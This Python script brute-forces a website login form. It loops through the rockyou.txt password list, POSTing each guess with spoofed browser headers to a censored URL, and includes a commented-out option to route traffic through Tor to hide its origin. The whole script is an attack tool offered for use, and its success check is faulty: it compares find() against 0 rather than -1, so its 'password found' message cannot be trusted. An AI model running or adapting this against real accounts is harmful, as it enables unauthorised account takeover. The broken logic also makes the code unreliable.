import requests
import sys
import urllib

url = "censoredURL"
expression = "Wrong"
expression2 = "correct"

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Origin': 'censoredURL',
    'Upgrade-Insecure-Requests': '1',
    'DNT': '1',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'censoredUSERAGENT',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Referer': 'censoredURL',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8,ro;q=0.7',
}





def brute(username, password):
    # data = {'username': username, 'password': password}
    data = {
        'email': 'censoredmail',
        'password': password
    }
    data = urllib.parse.urlencode(data)

    # data2= "email=test%40test.com&password=muieponta"

    # r = requests.post(url, data=data2)
    r = ""
    try:

        # session = requests.session()
        # session.proxies = {}
        # session.proxies['http'] = 'socks5h://localhost:9050'
        # session.proxies['https'] = 'socks5h://localhost:9050'

        r = requests.post('censoredURL', headers=headers, data=data)

        # a = r.content.join(map(chr, bytes))
        a = r.content.decode("utf-8")
        result_x = a.find(expression)
        if result_x != 0:
            print("[+] Correct password Found: ", password)
            sys.exit()
        else:
            print(a, " ", password)
    except requests.exceptions.ConnectionError:
        r.status_code = "Connection refused"


def main():
    words = [w.strip() for w in open("/Users/xxx/Desktop/rockyou.txt", "r").readlines()]  # parse wordlist
    for payload in words:
        brute("admin", payload)


if __name__ == '__main__':
    main()
